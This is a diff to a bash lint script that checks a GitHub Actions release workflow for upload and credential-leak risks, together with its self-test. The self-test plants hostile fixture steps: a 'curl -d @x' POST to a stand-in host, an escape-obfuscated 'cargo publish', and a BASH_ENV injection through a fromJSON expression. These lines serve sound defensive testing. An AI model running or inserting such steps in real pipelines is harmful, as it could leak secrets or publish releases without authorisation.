@@ -124,10 +124,10 @@ EOF
 # Its status is yq's, so a caller can tell a query that failed from one that found nothing.
 lint_q() { "$YQ" "$@" - <<< "$x"; }
 
-# lint_unmeasured NAME: a query yq could not evaluate is red. Its empty answer is never
+# lint_unmeasured NAME: a query yq fails on is red. Its empty answer is never
 # read as "nothing found": a job `env:` written as a string makes `keys` error, and an
 # empty list of disallowed names is what every allowlist check reads as a pass.
-lint_unmeasured() { echo "lint: yq could not evaluate the $1 check (a check that cannot be measured is red)"; bad=1; }
+lint_unmeasured() { echo "lint: yq failed on the $1 check (a check that cannot be measured is red)"; bad=1; }
 
 # lint FILE: every property that keeps the rehearsal from uploading. One line per failure.
 lint() {
@@ -431,7 +431,7 @@ self_test() {
     # raw text never shows the word; the parsed form does. The escapes are built here,
     # not written out, so this file never holds one either.
     escrow() { # escrow VALUE PATTERN: VALUE goes in as a double-quoted YAML scalar
-        V=PLANTED "$YQ" '.jobs["build-apr-cpu"].steps[1].env.T = strenv(V) | .jobs["build-apr-cpu"].steps[1].run = "curl -d @x https://example.invalid/"' "$d/fx.yml" > "$d/m0.yml"
+        PV=PLANTED "$YQ" '.jobs["build-apr-cpu"].steps[1].env.T = strenv(PV) | .jobs["build-apr-cpu"].steps[1].run = "curl -d @x https://example.invalid/"' "$d/fx.yml" > "$d/m0.yml"
         local y; y=$(< "$d/m0.yml"); printf '%s\n' "${y/PLANTED/"\"$1\""}" > "$d/m.yml"
         out=$(lint "$d/m.yml"); row "a later step with env T: \"$1\" (escaped) and curl -d -> lint red" 1 $? "$2" "$out"
     }
@@ -441,7 +441,7 @@ self_test() {
     # The upload tripwire reads the decoded text too: a run written with an escaped letter
     # is the same command once Actions has read the YAML.
     esc_c=$(printf '\\%s' x63)
-    V=PLANTED "$YQ" '.jobs["build-apr-cuda"].steps[4].name = "up" | .jobs["build-apr-cuda"].steps[4].run = strenv(V)' "$d/fx.yml" > "$d/m0.yml"
+    PV=PLANTED "$YQ" '.jobs["build-apr-cuda"].steps[4].name = "up" | .jobs["build-apr-cuda"].steps[4].run = strenv(PV)' "$d/fx.yml" > "$d/m0.yml"
     y=$(< "$d/m0.yml"); printf '%s\n' "${y/PLANTED/"\"${esc_c}argo publish\""}" > "$d/m.yml"
     out=$(lint "$d/m.yml"); row "a run of cargo publish with an escaped first letter -> lint red" 1 $? 'an upload' "$out"
     # Without a credential the same POST has nothing to write with: lint stays green, and
@@ -485,16 +485,16 @@ self_test() {
     }
     failrow 'spec=true explode(.)' 'cannot parse'
     failrow '-I=0 explode(.)' 'cannot parse'
-    failrow '-I=0 .permissions' 'evaluate the workflow permissions check'
-    failrow 'has("permissions")' 'evaluate the job permissions check'
-    failrow 'has("environment")' 'evaluate the job environment check'
-    failrow '.on | keys' 'evaluate the trigger check'
-    failrow 'load(strenv(G))' 'evaluate the credential guard check'
-    failrow 'has("if")' 'evaluate the step if check'
-    failrow 'concurrency|jobs)$' 'evaluate the workflow key check'
-    failrow 'strategy|env|if)$' 'evaluate the job key check'
-    failrow 'MACOSX_DEPLOYMENT_TARGET)$' 'evaluate the job env check'
-    failrow 'download-artifact)$' 'evaluate the action allowlist check'
+    failrow '-I=0 .permissions' 'failed on the workflow permissions check'
+    failrow 'has("permissions")' 'failed on the job permissions check'
+    failrow 'has("environment")' 'failed on the job environment check'
+    failrow '.on | keys' 'failed on the trigger check'
+    failrow 'load(strenv(G))' 'failed on the credential guard check'
+    failrow 'has("if")' 'failed on the step if check'
+    failrow 'concurrency|jobs)$' 'failed on the workflow key check'
+    failrow 'strategy|env|if)$' 'failed on the job key check'
+    failrow 'MACOSX_DEPLOYMENT_TARGET)$' 'failed on the job env check'
+    failrow 'download-artifact)$' 'failed on the action allowlist check'
     failrow 'upload-artifact@' 'keeps no checksums'
     mut '.jobs["build-apr-darwin"].steps[0].run = "true"'
     out=$(lint "$d/m.yml"); row "a hollow guard (right name, empty body) -> lint red" 1 $? 'credential guard' "$out"
@@ -529,7 +529,7 @@ self_test() {
     # A job env written as an expression string has no keys for yq to read; the query fails,
     # and a failed query is red, never an empty list of names.
     V="\${{ fromJSON('{\"BASH_ENV\":\"x.sh\"}') }}" "$YQ" '.jobs["build-apr-cuda"].env = strenv(V)' "$d/fx.yml" > "$d/m.yml"
-    out=$(lint "$d/m.yml"); row "a job env written as an expression string -> lint red" 1 $? 'evaluate the job env check' "$out"
+    out=$(lint "$d/m.yml"); row "a job env written as an expression string -> lint red" 1 $? 'failed on the job env check' "$out"
     mut '.jobs["build-apr-darwin"].env.MACOSX_DEPLOYMENT_TARGET = "11.0"'
     out=$(lint "$d/m.yml"); row "the release's own job env (MACOSX_DEPLOYMENT_TARGET) -> still cannot upload" 0 $? 'cannot upload' "$out"
     mut '.env.BASH_ENV = "x.sh"'
